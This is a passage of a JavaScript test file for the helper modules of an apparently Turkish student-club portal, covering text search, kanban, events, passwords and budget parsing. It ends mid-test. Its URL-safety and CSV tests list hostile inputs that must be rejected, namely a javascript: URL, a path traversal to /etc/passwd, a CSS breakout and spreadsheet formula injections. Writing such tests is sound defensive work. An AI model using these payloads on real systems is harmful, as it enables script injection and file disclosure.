// Checks for the pure (browser-free, import-free) helpers.
//
//   node scripts/check-pure.mjs
//
// Node strips TypeScript types itself, so these modules are imported directly.
// That only works for files with no `@/` aliases and no extension-less relative
// imports — which is exactly what keeps them pure and easy to test.
import assert from 'node:assert/strict';
import { detectBrowser, detectPlatform, isInstalledApp } from '../src/lib/client/pwaDetect.ts';
import { fill, foldTr, scoreMatch, slugify, uniqueSlug } from '../src/lib/text.ts';
import { groupNotifications, unreadCount } from '../src/lib/notifications.ts';
import { dayOffset, relativeTime } from '../src/core/data/format.ts';
import { escapeHtml } from '../src/core/text/escape.ts';
import { initials } from '../src/core/text/initials.ts';
import { ADMIN_ROL_ID, TUM_YETKILER, YETKI_UYGULAMALARI, YETKI_ACIKLAMALARI, canManage, canUse, fazlaYetkiler, herhangiYonetim, normalizeIzinler, rolHatasi, rolVerilebilirMi, seviyeOf } from '../src/core/permissions/index.ts';
import {
	ACCENTS,
	DEFAULT_THEME_PREFS,
	THEME_STORAGE_KEY,
	htmlAttributes,
	parseThemePrefs,
	resolveReduceMotion,
	resolveTheme,
	serializeThemePrefs,
	themeBootScript,
	toggledTheme,
} from '../src/core/theme/pure.ts';
import { DEFAULT_WALLPAPER, WALLPAPERS, isAuroraWallpaper, nextWallpaper, wallpaperInfo, wallpaperPreview } from '../src/core/theme/wallpapers.ts';
import { consumeRateLimit } from '../src/lib/rateLimit.ts';
import { clientAddress, parseIpCandidate } from '../src/lib/http.ts';
import { BILDIRIM_TURLERI } from '../src/core/notifications/kinds.ts';
import { ALL_MANIFESTS, DEFAULT_DOCK_ORDER, WINDOW_MANIFESTS, appColor } from '../src/apps/index.ts';
import { SETTINGS_SECTIONS, SETTINGS_TAB_IDS } from '../src/configs/settings.config.ts';
import { KURULUM_GENEL_MESAJ, createKurulumCache, kurulumYaniti } from '../src/lib/kurulum.ts';
import { isSafeImageUrl } from '../src/types/news.ts';
import {
	normalizeDurum,
	normalizeEtiketler,
	normalizeOncelik,
	normalizeTeslimTarihi,
	siraBetween,
	siraFits,
	teslimDurumu,
	toDateInput,
} from '../src/lib/kanban.ts';
import { POSTA_ISLEMLERI, POSTA_KLASORLERI, atlananAciklamasi, onizlemeSatiri } from '../src/lib/posta.ts';
import { isProjeDurumu, normalizeHttpUrl, normalizeTeknolojiler, shortRepo } from '../src/lib/projects.ts';
import {
	YOKLAMA_PENCERESI_MS,
	YOKLAMA_TOLERANS_MS,
	biletKoduMetni,
	csvCell,
	parseBiletKodu,
	parseYoklamaKodu,
	pencereKalanMs,
	toCsv,
	yoklamaKoduMetni,
	yoklamaPenceresi,
	yoklamaZamaniMi,
} from '../src/lib/events.ts';
import { BASVURU_NOTU_MAX, UZMANLIK_MAX_ADET, basvuruNotuOlustur, isKategori, isKatilimTuru, isTakimDurumu, kontenjanHatasi, normalizeRol } from '../src/lib/teams.ts';
import { myOpenTasks, nextEvent } from '../src/lib/mobileCockpit.ts';
import { seviye, sifreHatasi } from '../src/lib/profile.ts';
import { rozetler } from '../src/lib/badges.ts';
import { evrakDogrulamaKodu, evrakSayisi } from '../src/lib/documents.ts';
import { gunSonu, iadeDurumu, iadeMetni, iadeTarihiHatasi, kodHatasi, normalizeKod } from '../src/lib/inventory.ts';
import {
	DENETIM_CSV_BASLIKLARI,
	DENETIM_ISLEMLERI,
	DENETIM_SAKLAMA_GUN,
	alanFarki,
	denetimCsvSatirlari,
	durumIslemi,
	farkSatirlari,
	kayitAlanlari,
	rolFarki,
	rolOzeti,
	saklamaGunu,
	smtpFarki,
	suzgecOku,
	temizIp,
	temizle,
	uyeHedefAdi,
	uyeOzeti,
} from '../src/lib/audit.ts';
import { isPrivateHost } from '../src/lib/mail/hosts.ts';
import { aylikAkis, filtreleKayitlar, formatKurus, kategoriDagilimi, parseTutar, tarihGecerliMi, yuruyenBakiye } from '../src/lib/budget.ts';
import { inspectDatabaseSql, inspectJsonPayload, inspectRequestComponents, inspectRequestPayload, maskDatabaseRow } from '../src/lib/waf.ts';

let count = 0;
function check(name, fn) {
	try {
		fn();
		count += 1;
	} catch (error) {
		console.error(`FAIL  ${name}\n${error.message}`);
		process.exitCode = 1;
	}
}

// For checks that have to await something; all of them are settled before the summary.
const pending = [];
function checkAsync(name, fn) {
	pending.push(
		fn().then(
			() => {
				count += 1;
			},
			(error) => {
				console.error(`FAIL  ${name}\n${error.message}`);
				process.exitCode = 1;
			}
		)
	);
}

/* ---------------- pwaDetect ---------------- */

const UA = {
	iphoneSafari:
		'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
	macSafari:
		'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
	androidChrome:
		'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	windowsEdge:
		'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
	linuxFirefox: 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
	linuxChrome:
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
	iosInstagram:
		'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 320.0.0.12.108',
	androidWebView:
		'Mozilla/5.0 (Linux; Android 14; Pixel 8 Build/UP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.0.0 Mobile Safari/537.36',
	firefoxIos:
		'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15',
};

check('an iPhone is iOS, not macOS (its UA contains "like Mac OS X")', () => {
	assert.equal(detectPlatform(UA.iphoneSafari, 5), 'ios');
	assert.equal(detectPlatform(UA.iphoneSafari), 'ios');
});
check('a Mac without a touch screen is macOS', () => {
	assert.equal(detectPlatform(UA.macSafari, 0), 'macos');
});
check('an iPad reporting a Mac UA is told apart by its touch points', () => {
	assert.equal(detectPlatform(UA.macSafari, 5), 'ios');
});
check('other platforms', () => {
	assert.equal(detectPlatform(UA.androidChrome, 5), 'android');
	assert.equal(detectPlatform(UA.windowsEdge), 'windows');
	assert.equal(detectPlatform(UA.linuxFirefox), 'linux');
	assert.equal(detectPlatform(UA.linuxChrome), 'linux');
	assert.equal(detectPlatform('', 0), 'windows');
});

check('browser families', () => {
	assert.equal(detectBrowser(UA.linuxFirefox), 'firefox');
	assert.equal(detectBrowser(UA.firefoxIos), 'firefox');
	assert.equal(detectBrowser(UA.linuxChrome), 'chromium');
	assert.equal(detectBrowser(UA.windowsEdge), 'chromium');
	assert.equal(detectBrowser(UA.androidChrome), 'chromium');
	assert.equal(detectBrowser(UA.iphoneSafari), 'safari');
	assert.equal(detectBrowser(UA.macSafari), 'safari');
});
check('in-app browsers are recognised before the engine they embed', () => {
	assert.equal(detectBrowser(UA.iosInstagram), 'inapp');
	assert.equal(detectBrowser(UA.androidWebView), 'inapp');
});

const none = {
	standalone: false,
	minimalUi: false,
	windowControlsOverlay: false,
	navigatorStandalone: false,
	androidAppReferrer: false,
};
check('a plain browser tab is not an installed app', () => {
	assert.equal(isInstalledApp(none), false);
});
check('every installed display mode counts', () => {
	for (const key of Object.keys(none)) {
		assert.equal(isInstalledApp({ ...none, [key]: true }), true, key);
	}
});
check('fullscreen is not one of the signals (F11 must not lift the wall)', () => {
	assert.equal(Object.keys(none).some((key) => /fullscreen/i.test(key)), false);
});

/* ---------------- text (search) ---------------- */

check('foldTr: Turkish and ASCII spellings meet', () => {
	assert.equal(foldTr('İSPARTA'), 'isparta');
	assert.equal(foldTr('Isparta'), 'isparta');
	assert.equal(foldTr('ısparta'), 'isparta');
	assert.equal(foldTr('Güvenlik Öğrenci Çalışma Şube Ağaç'), 'guvenlik ogrenci calisma sube agac');
	assert.equal(foldTr('BİLGİSAYAR MÜHENDİSLİĞİ'), 'bilgisayar muhendisligi');
	assert.equal(foldTr(null), '');
	assert.equal(foldTr(undefined), '');
});
check('scoreMatch: every query word must hit', () => {
	const team = [{ text: 'Web & Mobil Platform Ekibi', weight: 3 }, { text: 'Yazılım', weight: 1 }];
	assert.ok(scoreMatch('web mobil', team) > 0);
	assert.equal(scoreMatch('web robotik', team), 0);
	assert.equal(scoreMatch('', team), 0);
	assert.equal(scoreMatch('   ', team), 0);
});
check('scoreMatch: accent-insensitive in both directions', () => {
	assert.ok(scoreMatch('guvenlik', [{ text: 'Siber Güvenlik', weight: 1 }]) > 0);
	assert.ok(scoreMatch('güvenlik', [{ text: 'siber guvenlik', weight: 1 }]) > 0);
	assert.ok(scoreMatch('ISPARTA', [{ text: 'ısparta', weight: 1 }]) > 0);
});
check('scoreMatch: a word start outranks a substring, and a title outranks a body', () => {
	const start = scoreMatch('aut', [{ text: 'Autonomous drone', weight: 1 }]);
	const inside = scoreMatch('aut', [{ text: 'Cauterize', weight: 1 }]);
	assert.ok(start > inside && inside > 0, `${start} vs ${inside}`);
	const title = scoreMatch('iha', [{ text: 'İHA takımı', weight: 3 }]);
	const body = scoreMatch('iha', [{ text: 'İHA takımı', weight: 1 }]);
	assert.ok(title > body);
});

/* ---------------- notifications ---------------- */

check('fill: replaces named placeholders and leaves unknown ones', () => {
	assert.equal(fill('{n} gün kaldı', { n: 3 }), '3 gün kaldı');
	assert.equal(fill('{a} ve {b}', { a: 'x', b: 2 }), 'x ve 2');
	assert.equal(fill('{missing}', {}), '{missing}');
	assert.equal(fill('düz metin', { n: 1 }), 'düz metin');
});

const HOUR = 3_600_000;
const item = (id, priority, at, extra = {}) => ({
	id, kind: 'news', priority, at, data: { title: id }, target: { appId: 'news' }, ...extra,
});

check('groupNotifications: pinned, to-dos by deadline, new vs earlier', () => {
	const items = [
		item('old-news', 'info', 100),
		item('new-news', 'info', 900),
		item('urgent', 'info', 500, { urgent: true }),
		item('task-late', 'action', 50, { dueAt: 2000 }),
		item('task-soon', 'action', 60, { dueAt: 1000 }),
		item('newer-news', 'info', 950),
	];
	const g = groupNotifications(items, 400);
	assert.equal(g.pinned?.id, 'urgent');
	assert.deepEqual(g.action.map((i) => i.id), ['task-soon', 'task-late']);
	assert.deepEqual(g.fresh.map((i) => i.id), ['newer-news', 'new-news']);
	assert.deepEqual(g.earlier.map((i) => i.id), ['old-news']);
	assert.ok(!g.fresh.concat(g.earlier).some((i) => i.id === 'urgent'), 'the pinned item is not listed twice');
});
check('groupNotifications: nothing pinned when nothing is urgent, and no input mutation', () => {
	const items = [item('a', 'info', 1), item('b', 'action', 2)];
	const copy = JSON.stringify(items);
	assert.equal(groupNotifications(items, 0).pinned, null);
	assert.equal(JSON.stringify(items), copy);
});

check('unreadCount: to-dos always count, information only once it is newer than the last look', () => {
	const response = {
		generatedAt: 1000,
		counts: { actionRequired: 3, total: 5 },
		items: [item('a', 'info', 800), item('b', 'info', 300), item('c', 'action', 10)],
	};
	assert.equal(unreadCount(response, 500), 3 + 1);
	assert.equal(unreadCount(response, 0), 3 + 2);
	assert.equal(unreadCount(response, 900), 3);
	assert.equal(unreadCount(null, 0), 0);
});

check('dayOffset: calendar days in local time, not 24 h windows', () => {
	const noon = new Date(2026, 5, 10, 12, 0).getTime();
	assert.equal(dayOffset(new Date(2026, 5, 10, 23, 59).getTime(), noon), 0);
	assert.equal(dayOffset(new Date(2026, 5, 10, 0, 1).getTime(), noon), 0);
	assert.equal(dayOffset(new Date(2026, 5, 11, 0, 1).getTime(), noon), 1);
	assert.equal(dayOffset(new Date(2026, 5, 9, 23, 59).getTime(), noon), -1);
	assert.equal(dayOffset(new Date(2026, 5, 13, 8, 0).getTime(), noon), 3);
});

check('relativeTime: picks a natural unit, in the requested language', () => {
	const now = new Date(2026, 5, 10, 12, 0).getTime();
	assert.match(relativeTime(now - 2 * HOUR, now, 'tr'), /2 saat önce/);
	assert.match(relativeTime(now - 5 * 60_000, now, 'en'), /5 minutes ago/);
	assert.match(relativeTime(now - 20_000, now, 'en'), /now/);
	assert.match(relativeTime(new Date(2026, 5, 9, 9, 0).getTime(), now, 'tr'), /dün/);
	assert.match(relativeTime(new Date(2026, 5, 12, 9, 0).getTime(), now, 'en'), /in 2 days/);
});

/* ---------------- slugs and news ---------------- */

check('slugify: Turkish letters are transliterated, not dropped', () => {
	assert.equal(slugify('Güz Dönemi Python & Makine Öğrenmesi Atölyeleri Başlıyor'), 'guz-donemi-python-makine-ogrenmesi-atolyeleri-basliyor');
	assert.equal(slugify('Siber Güvenlik'), 'siber-guvenlik');
	assert.equal(slugify('IŞIK İLE ÇALIŞMA'), 'isik-ile-calisma');
	assert.equal(slugify('  --Merhaba,   Dünya!!  '), 'merhaba-dunya');
});
check('slugify: length is capped without leaving a trailing dash, and junk gives an empty slug', () => {
	const long = slugify('kelime '.repeat(40), 30);
	assert.ok(long.length <= 30 && !long.endsWith('-'), long);
	assert.equal(slugify('!!! 🎉'), '');
	assert.equal(slugify(''), '');
});
checkAsync('uniqueSlug: numbers a slug that is taken, and falls back when there is nothing to slug', async () => {
	const taken = new Set(['haber', 'haber-2']);
	assert.equal(await uniqueSlug('haber', async (c) => taken.has(c)), 'haber-3');
	assert.equal(await uniqueSlug('yeni', async (c) => taken.has(c)), 'yeni');
	assert.equal(await uniqueSlug('', async () => false, 'haber'), 'haber');
});
check('isSafeImageUrl: https and the portal presets only, nothing that can break out of url(...)', () => {
	assert.ok(isSafeImageUrl('https://cdn.example.org/a/b.png?x=1'));
	assert.ok(isSafeImageUrl('/app-icons/vscode/256.png'));
	for (const bad of [
		'http://insecure.example.org/a.png',
		'javascript:alert(1)',
		'data:image/png;base64,AAAA',
		'https://x.org/a.png);background:red',
		'https://x.org/a"b.png',
		"https://x.org/a'b.png",
		'/app-icons/../../etc/passwd',
		'/uploads/secret.png',
		'//evil.example.org/a.png',
		'',
	]) {
		assert.ok(!isSafeImageUrl(bad), bad);
	}
});

/* ---------------- kanban ---------------- */

check('task states: canonical values, legacy aliases, and junk', () => {
	assert.equal(normalizeDurum('inceleme'), 'inceleme');
	assert.equal(normalizeDurum(' Tamamlandi '), 'tamamlandi');
	assert.equal(normalizeDurum('bitti'), 'tamamlandi');
	assert.equal(normalizeDurum('review'), 'inceleme');
	assert.equal(normalizeDurum('arsiv'), null);
	assert.equal(normalizeDurum(3), null);
	assert.equal(normalizeOncelik('KRITIK'), 'kritik');
	assert.equal(normalizeOncelik('acil'), null);
});

check('labels are folded, hyphenated, de-duplicated and capped', () => {
	assert.deepEqual(normalizeEtiketler(['  Front End ', '#UX', 'ux', '', 'İHA']), ['front-end', 'ux', 'iha']);
	assert.deepEqual(normalizeEtiketler([]), []);
	assert.equal(normalizeEtiketler('ux'), null);
	assert.equal(normalizeEtiketler(['ok', 5]), null);
	assert.equal(normalizeEtiketler(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h']).length, 6);
	assert.equal(normalizeEtiketler(['x'.repeat(50)])[0].length, 24);
});

check('due dates: numbers, ISO days (end of that local day), clearing, junk', () => {
	assert.equal(normalizeTeslimTarihi(null), null);
	assert.equal(normalizeTeslimTarihi(''), null);
	assert.equal(normalizeTeslimTarihi(1_800_000_000_000), 1_800_000_000_000);
	assert.equal(normalizeTeslimTarihi(-5), undefined);
	assert.equal(normalizeTeslimTarihi(Number.NaN), undefined);
	assert.equal(normalizeTeslimTarihi('yarın'), undefined);
	assert.equal(normalizeTeslimTarihi({}), undefined);
	const d = new Date(normalizeTeslimTarihi('2026-10-12'));
	assert.deepEqual([d.getFullYear(), d.getMonth(), d.getDate(), d.getHours(), d.getMinutes()], [2026, 9, 12, 23, 59]);
	assert.equal(toDateInput(normalizeTeslimTarihi('2026-01-05')), '2026-01-05');
	assert.equal(toDateInput(null), '');
});

check('drop position: between, above the first, below the last, empty column', () => {
	assert.equal(siraBetween(10, 20, 0), 15);
	assert.equal(siraBetween(undefined, 20, 0), 20 - 1024);
	assert.equal(siraBetween(10, undefined, 0), 10 + 1024);
	assert.equal(siraBetween(undefined, undefined, -42), -42);
	// Repeated drops into the same gap eventually exhaust float precision at the
	// magnitude real keys have (-epoch ms); siraFits must notice before order breaks.
	let lo = -1_791_000_000_000, hi = lo + 1, steps = 0;
	for (;;) {
		const mid = siraBetween(lo, hi, 0);
		if (!siraFits(lo, mid, hi)) break;
		hi = mid;
		steps += 1;
		assert.ok(steps < 200, 'gap never ran out');
	}
	assert.ok(steps > 5, `only ${steps} drops fit`);
	assert.equal(siraFits(undefined, 5, undefined), true);
	assert.equal(siraFits(5, 5, 9), false);
});

check('due state relative to now; done tasks are never late', () => {
	const now = new Date(2026, 9, 5, 12, 0).getTime();
	const at = (d, h = 12) => new Date(2026, 9, d, h, 0).getTime();
	assert.equal(teslimDurumu(at(4), 'suruyor', now), 'gecikti');
	assert.equal(teslimDurumu(at(4), 'tamamlandi', now), null);
	assert.equal(teslimDurumu(at(5, 18), 'yapilacak', now), 'bugun');
	assert.equal(teslimDurumu(at(6), 'yapilacak', now), 'yakin');
	assert.equal(teslimDurumu(at(7), 'yapilacak', now), 'yakin');
	assert.equal(teslimDurumu(at(9), 'yapilacak', now), 'ileri');
	assert.equal(teslimDurumu(null, 'yapilacak', now), null);
});

/* ---------------- projects ---------------- */

check('project links: only http(s) with a real host reach an href', () => {
	assert.equal(normalizeHttpUrl('https://github.com/x/y'), 'https://github.com/x/y');
	assert.equal(normalizeHttpUrl('  http://a.b  '), 'http://a.b/');
	assert.equal(normalizeHttpUrl(''), null);
	assert.equal(normalizeHttpUrl(null), null);
	assert.equal(normalizeHttpUrl('javascript:alert(1)'), undefined);
	assert.equal(normalizeHttpUrl('ftp://a.b/c'), undefined);
	assert.equal(normalizeHttpUrl('https://localhost/x'), undefined);
	assert.equal(normalizeHttpUrl('github.com/x'), undefined);
	assert.equal(normalizeHttpUrl(42), undefined);
});

check('technologies: comma list or array, casing kept, duplicates folded, capped', () => {
	assert.deepEqual(normalizeTeknolojiler('Next.js, PostgreSQL , next.js,,'), ['Next.js', 'PostgreSQL']);
	assert.deepEqual(normalizeTeknolojiler(['ROS2', 'ros2', '  C++ ']), ['ROS2', 'C++']);
	assert.deepEqual(normalizeTeknolojiler(''), []);
	assert.equal(normalizeTeknolojiler(5), null);
	assert.equal(normalizeTeknolojiler(['ok', {}]), null);
	assert.equal(normalizeTeknolojiler(Array.from({ length: 30 }, (_, i) => `t${i}`)).length, 12);
});

check('project status and repo display', () => {
	assert.ok(isProjeDurumu('oneri') && isProjeDurumu('arsiv'));
	assert.ok(!isProjeDurumu('silindi') && !isProjeDurumu(undefined));
	assert.equal(shortRepo('https://www.github.com/beuteknoloji/portal/'), 'github.com/beuteknoloji/portal');
	assert.equal(shortRepo(null), '');
});

/* ---------------- events ---------------- */

check('attendance codes round-trip and reject look-alikes', () => {
	const k = { etkinlikId: 'evt_04', pencere: 59708013, imza: 'IANoK_gYemiyKv0ytCbbfC' };
	const text = yoklamaKoduMetni(k);
	assert.deepEqual(parseYoklamaKodu(text), k);
	// The link a phone camera opens carries the same token.
	assert.deepEqual(parseYoklamaKodu(`https://portal.example.org/yoklama/${encodeURIComponent(text)}`), k);
	assert.equal(parseYoklamaKodu('evt_04'), null);
	assert.equal(parseYoklamaKodu('BY1.evt_04.x.IANoK_gYemiyKv0ytCbbfC'), null);
	assert.equal(parseYoklamaKodu('BY1.evt 04.1.IANoK_gYemiyKv0ytCbbfC'), null);
	assert.equal(parseYoklamaKodu('BY1.evt_04.1.short'), null);
	assert.equal(parseYoklamaKodu(null), null);
	const b = { etkinlikId: 'evt_01', userId: 'usr_uye_04', imza: 'abcdefghijklmnopqrstuv' };
	assert.deepEqual(parseBiletKodu(biletKoduMetni(b)), b);
	// A ticket is not a projector code and vice versa.
	assert.equal(parseYoklamaKodu(biletKoduMetni(b)), null);
	assert.equal(parseBiletKodu(text), null);
});

check('check-in windows and timing', () => {
	const t0 = 1_790_000_000_000;
	assert.equal(yoklamaPenceresi(t0), Math.floor(t0 / YOKLAMA_PENCERESI_MS));
	assert.ok(pencereKalanMs(t0) > 0 && pencereKalanMs(t0) <= YOKLAMA_PENCERESI_MS);
	const start = t0;
	const end = t0 + 3_600_000;
	assert.equal(yoklamaZamaniMi(start, end, start - YOKLAMA_TOLERANS_MS), true);
	assert.equal(yoklamaZamaniMi(start, end, start - YOKLAMA_TOLERANS_MS - 1), false);
	assert.equal(yoklamaZamaniMi(start, end, end + YOKLAMA_TOLERANS_MS), true);
	assert.equal(yoklamaZamaniMi(start, end, end + YOKLAMA_TOLERANS_MS + 1), false);
});

check('CSV: quoting, separators and spreadsheet formula injection', () => {
	assert.equal(csvCell('Ege Kılıç'), 'Ege Kılıç');
	assert.equal(csvCell('a;b'), '"a;b"');
	assert.equal(csvCell('say "hi"'), '"say ""hi"""');
	assert.equal(csvCell('=HYPERLINK("x")'), `"'=HYPERLINK(""x"")"`);
	assert.equal(csvCell('+90 555'), "'+90 555");
	assert.equal(csvCell('@cmd'), "'@cmd");
	assert.equal(csvCell(null), '');
	assert.equal(toCsv(['a', 'b'], [[1, 'x\ny']]), 'a;b\r\n1;"x\ny"');
});

/* ---------------- teams ---------------- */

check('team rules: categories, modes, roles and quota', () => {
	assert.ok(isKategori('Web & Mobil') && !isKategori('Uzay'));
	assert.ok(isKatilimTuru('onayli') && !isKatilimTuru('kapali'));
	assert.ok(isTakimDurumu('askida') && !isTakimDurumu('silindi'));
	assert.equal(normalizeRol('  Binary   Exploitation  '), 'Binary Exploitation');
	assert.equal(normalizeRol('   '), null);
	assert.equal(normalizeRol(5), null);
	assert.equal(normalizeRol('x'.repeat(80)).length, 40);
	assert.equal(kontenjanHatasi(6, 3), null);
	assert.equal(kontenjanHatasi(3, 3), null);
	assert.match(kontenjanHatasi(2, 3), /3 aktif üye/);
	assert.match(kontenjanHatasi(0, 0), /arasında/);
	assert.match(kontenjanHatasi(31, 0), /arasında/);
	assert.match(kontenjanHatasi(2.5, 0), /arasında/);
	assert.match(kontenjanHatasi('abc', 0), /arasında/);
});

check('onboarding application note: skills line, free text, caps', () => {
	assert.equal(basvuruNotuOlustur([], ''), null);
	assert.equal(basvuruNotuOlustur(undefined, undefined), null);
	assert.equal(basvuruNotuOlustur(['C++', 'ROS2'], ''), 'Uzmanlık: C++, ROS2');
	assert.equal(basvuruNotuOlustur([], '  Merhaba  '), 'Merhaba');
	assert.equal(basvuruNotuOlustur(['PCB'], 'İHA istiyorum'), 'Uzmanlık: PCB\nİHA istiyorum');
	// trimmed, de-duplicated case-insensitively (the Turkish way), non-strings dropped
	assert.equal(basvuruNotuOlustur([' c++ ', 'C++', 5, null, '', 'ı', 'I'], ''), 'Uzmanlık: c++, ı');
	assert.equal(basvuruNotuOlustur('C++', ''), null); // not an array
	assert.equal(basvuruNotuOlustur(Array.from({ length: 20 }, (_, i) => `s${i}`), '').split(', ').length, UZMANLIK_MAX_ADET);
	assert.equal(basvuruNotuOlustur([], 'x'.repeat(900)).length, BASVURU_NOTU_MAX);
	assert.ok(basvuruNotuOlustur(['y'.repeat(90)], '').length <= 'Uzmanlık: '.length + 30);
});

check('phone cockpit: my open tasks and the next event', () => {
	const task = (id, atanan, status, teslim) => ({ id, teamId: 't', baslik: id, status, atananUyeId: atanan, teslimTarihi: teslim });
	const teams = [
		{ ad: 'Roket', gorevler: [task('a', 'u1', 'yapilacak', null), task('b', 'u2', 'yapilacak', 1), task('c', 'u1', 'tamamlandi', 5)] },
		{ ad: 'İHA', gorevler: [task('d', 'u1', 'suruyor', 200), task('e', 'u1', 'inceleme', 100), task('f', 'u1', 'yapilacak', null)] },
	];
	const mine = myOpenTasks(teams, 'u1');
	assert.deepEqual(mine.map((x) => x.id), ['e', 'd', 'a', 'f']); // deadline first, undated keep board order
	assert.equal(mine[0].takimAdi, 'İHA');
	assert.deepEqual(myOpenTasks(teams, 'nobody'), []);
	assert.deepEqual(myOpenTasks([], 'u1'), []);

	const ev = (id, status, baslangic, endTime) => ({ id, status, baslangic, endTime });
	const now = 1000;
	assert.equal(nextEvent([], now), null);
	assert.equal(nextEvent([ev('past', 'yayinda', 1, 500)], now), null);
	assert.equal(nextEvent([ev('draft', 'taslak', 1100, 1200)], now), null);
	assert.equal(nextEvent([ev('later', 'yayinda', 3000, 4000), ev('soon', 'yayinda', 1500, 2000)], now).id, 'soon');
	assert.equal(nextEvent([ev('soon', 'yayinda', 1500, 2000), ev('live', 'yayinda', 900, 1100)], now).id, 'live');
	assert.equal(nextEvent([ev('live2', 'yayinda', 900, 1900), ev('live1', 'yayinda', 800, 1100)], now).id, 'live1'); // ends first
	assert.equal(nextEvent([ev('edge', 'yayinda', 1, 1000)], now).id, 'edge'); // ends exactly now: still on
});

/* ---------------- profile ---------------- */

check('password rules', () => {
	assert.equal(sifreHatasi('Kampus-2026x'), null);
	assert.match(sifreHatasi('Password123'), /en çok sızdırılan/);
	assert.match(sifreHatasi('12345678a'), /en çok sızdırılan/);
	assert.match(sifreHatasi('abc1'), /en az 8/);
	assert.match(sifreHatasi('sadeceharf'), /harf ve bir rakam/);
	assert.match(sifreHatasi('12345678'), /harf ve bir rakam/);
	assert.match(sifreHatasi('Şifre-çok-2026', { mevcut: 'Şifre-çok-2026' }), /aynı olamaz/);
	assert.match(sifreHatasi('burak.sahin99', { email: 'burak.sahin@beuteknoloji.org' }), /e-posta/);
	assert.equal(sifreHatasi('Ab1xxxxx', { email: 'ab@x.org' }), null); // a 2-letter local part is not checked
	assert.match(sifreHatasi(null), /gerekli/);
	assert.match(sifreHatasi('a1'.repeat(70)), /en fazla/);
});

check('levels from XP', () => {
	assert.deepEqual(seviye(0), { seviye: 1, ilerleme: 0, sonraki: 100 });
	assert.equal(seviye(99).seviye, 1);
	assert.equal(seviye(100).seviye, 2);
	assert.equal(seviye(299).seviye, 2);
	assert.equal(seviye(300).seviye, 3);
	assert.equal(seviye(820).seviye, 4);
	assert.equal(seviye(820).sonraki, 1000);
	assert.equal(seviye(-50).seviye, 1);
});

/* ---------------- badges ---------------- */

check('badges follow the record, earned first, progress capped', () => {
	const none = rozetler({ xp: 0, takim: 0, kaptan: false, katilinanEtkinlik: 0, tamamlananGorev: 0, sertifika: 0, proje: 0 });
	assert.equal(none.length, 8);
	assert.equal(none.filter((r) => r.kazanildi).length, 0);
	const some = rozetler({ xp: 1850, takim: 2, kaptan: true, katilinanEtkinlik: 7, tamamlananGorev: 3, sertifika: 0, proje: 1 });
	const byId = Object.fromEntries(some.map((r) => [r.id, r]));
	assert.ok(byId['ilk-adim'].kazanildi && byId['mudavim'].kazanildi && byId['kaptan'].kazanildi && byId['yildiz'].kazanildi);
	assert.ok(!byId['task-avcisi'].kazanildi && byId['task-avcisi'].deger === 3);
	assert.equal(byId['mudavim'].deger, 5); // capped at the target
	const firstLocked = some.findIndex((r) => !r.kazanildi);
	assert.ok(some.slice(firstLocked).every((r) => !r.kazanildi), 'earned badges come first');
	assert.equal(some[firstLocked].id, 'task-avcisi'); // closest to being earned (3/10 beats 0/1)
});

/* ---------------- documents ---------------- */

check('document numbers print as year/sequence', () => {
	assert.equal(evrakSayisi(2026005), '2026/005');
	assert.equal(evrakSayisi(2026123), '2026/123');
	assert.equal(evrakSayisi(1999001), '1999/001');
	assert.equal(evrakSayisi(42), '42'); // outside the scheme: as is
	assert.equal(evrakSayisi(Number.NaN), '');
	assert.equal(evrakDogrulamaKodu(2026005), 'ORBIT-DOC-2026005');
});

/* ---------------- kasa ---------------- */

check('amounts typed in Turkish or English style', () => {
	assert.equal(parseTutar('1.234,56'), 123456);
	assert.equal(parseTutar('1234,56'), 123456);
	assert.equal(parseTutar('1234.56'), 123456);
	assert.equal(parseTutar('1,234.56'), 123456);
	assert.equal(parseTutar('1.234'), 123400); // a thousands group, not 1.234 lira
	assert.equal(parseTutar('1,5'), 150);
	assert.equal(parseTutar('₺ 12'), 1200);
	assert.equal(parseTutar('1 234,5'), 123450);
	assert.equal(parseTutar('1.234.567,89'), 123456789);
	for (const bad of ['', 'abc', '-5', '0', '0,00', '12,', '12.3456', '1e5', '1..2', '12,34,56'])
		assert.equal(parseTutar(bad), null, bad);
	assert.equal(formatKurus(123456789), '1.234.567,89');
	assert.equal(formatKurus(5), '0,05');
	assert.equal(formatKurus(-150000), '-1.500,00');
});

check('ledger: running balance, categories, months, filters', () => {
	const t = (s) => new Date(s).getTime();
	const rows = [
		{ id: 'c', date: t('2026-09-06T10:00'), tur: 'gider', kategori: 'Donanım', tutarKurus: 890000, aciklama: 'Raspberry Pi', kaydedenAdSoyad: 'Mehmet Demir' },
		{ id: 'a', date: t('2026-08-22T10:00'), tur: 'gelir', kategori: 'Sponsorluk', tutarKurus: 3500000, aciklama: 'Sponsor' },
		{ id: 'd', date: t('2026-10-01T10:00'), tur: 'gider', kategori: 'İkram', tutarKurus: 115000, aciklama: 'Çay, kahve' },
		{ id: 'e', date: t('2026-10-04T10:00'), tur: 'gider', kategori: 'Donanım', tutarKurus: 165000, aciklama: 'Filament' },
	];
	const b = yuruyenBakiye(rows);
	assert.deepEqual([b.get('a'), b.get('c'), b.get('d'), b.get('e')], [3500000, 2610000, 2495000, 2330000]);
	const dag = kategoriDagilimi(rows);
	assert.deepEqual(dag.map((d) => d.kategori), ['Donanım', 'İkram']);
	assert.equal(dag[0].tutarKurus, 1055000);
